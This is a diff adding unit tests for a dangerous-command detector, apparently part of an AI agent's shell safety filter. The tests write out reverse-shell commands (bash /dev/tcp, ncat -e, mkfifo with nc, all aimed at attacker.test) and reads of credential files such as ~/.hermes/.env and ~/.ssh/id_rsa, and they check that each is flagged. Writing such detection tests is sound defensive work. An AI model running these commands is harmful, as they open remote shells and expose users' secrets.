@@ -880,6 +880,44 @@ class TestGitDestructiveOps:
         assert dangerous is True
 
 
+class TestReverseShellDetection:
+    def test_bash_dev_tcp_reverse_shell_detected(self):
+        dangerous, _, desc = detect_dangerous_command(
+            "bash -i >& /dev/tcp/attacker.test/4444 0>&1"
+        )
+        assert dangerous is True
+        assert "reverse shell" in desc.lower()
+
+    def test_netcat_exec_reverse_shell_detected(self):
+        dangerous, _, desc = detect_dangerous_command("ncat attacker.test 4444 -e /bin/sh")
+        assert dangerous is True
+        assert "netcat" in desc.lower() or "reverse shell" in desc.lower()
+
+    def test_mkfifo_netcat_reverse_shell_detected(self):
+        dangerous, _, desc = detect_dangerous_command(
+            "mkfifo /tmp/f; nc attacker.test 4444 < /tmp/f"
+        )
+        assert dangerous is True
+        assert "reverse shell" in desc.lower()
+
+
+class TestSensitiveCredentialReads:
+    def test_cat_hermes_env_detected(self):
+        dangerous, _, desc = detect_dangerous_command("cat ~/.hermes/.env")
+        assert dangerous is True
+        assert "credential" in desc.lower()
+
+    def test_grep_hermes_env_detected(self):
+        dangerous, _, desc = detect_dangerous_command("grep OPENAI_API_KEY ~/.hermes/.env")
+        assert dangerous is True
+        assert "credential" in desc.lower()
+
+    def test_cat_ssh_key_detected(self):
+        dangerous, _, desc = detect_dangerous_command("cat ~/.ssh/id_rsa")
+        assert dangerous is True
+        assert "credential" in desc.lower()
+
+
 class TestChmodExecuteCombo:
     """chmod +x && ./ is the two-step social engineering pattern where a
     script is first made executable then immediately run. The script
